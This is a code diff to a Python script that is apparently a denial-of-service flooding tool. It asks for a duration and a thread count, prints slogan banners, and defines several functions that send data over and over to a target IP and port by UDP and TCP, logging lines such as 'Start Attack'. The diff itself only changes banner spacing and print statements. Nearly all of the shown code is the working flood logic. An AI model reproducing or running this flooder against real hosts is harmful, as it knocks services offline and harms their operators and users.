@@ -62,15 +62,15 @@ choice = str(input("\033[31m(y/n) :  \033[0m"))
 times = int(input("\033[96mTime : \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
-print("\033[96m                  ⟩⟩  ANTI RACIST \033[0m "),
+print("\033[96m                ⟩⟩  ANTI RACIST \033[0m "),
 time.sleep(5),
-print("\033[92m                  ⟩⟩  ANTI TERRORIST \033[0m "),
+print("\033[92m                ⟩⟩  ANTI TERRORIST \033[0m "),
 time.sleep(5),
-print("\033[1m                  ⟩⟩  ANTI OPPRESSION \033[0m "),
+print("\033[1m                ⟩⟩  ANTI OPPRESSION \033[0m "),
 time.sleep(5),
-print("\033[97m                  ⟩⟩  ANTI GENOCIDE \033[0m "),
+print("\033[97m                ⟩⟩  ANTI GENOCIDE \033[0m "),
 time.sleep(5),
-print("\033[95m                  ⟩⟩  FUCK U MURDER \033[0m "),
+print("\033[95m                ⟩⟩  FUCK U MURDER \033[0m "),
 time.sleep(5),
 
 def run():
@@ -82,7 +82,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i + "\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
+			print("\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
 		except:
 			print("[!] Error!")
 
@@ -96,7 +96,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[95m[\033[97m+\033[95m]  \033[31mStart Attack :::..." +ip+ " \033[0m")
+			print("\033[95m[\033[97m+\033[95m]  \033[31mStart Attack :::..." +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[+] Error!")
@@ -112,7 +112,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[95m[\033[97m+\033[95m]   \033[92mStatus Sent ::::..." +ip+ " \033[0m")
+			print("\033[95m[\033[97m+\033[95m]   \033[92mStatus Sent ::::..." +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[*] Error!")
@@ -128,7 +128,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[95m[\033[97m+\033[95m]  \033[91mRequest Sent :::..  " +ip+ " \033[0m")
+			print("\033[95m[\033[97m+\033[95m]  \033[91mRequest Sent :::..  " +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[+] Error!")
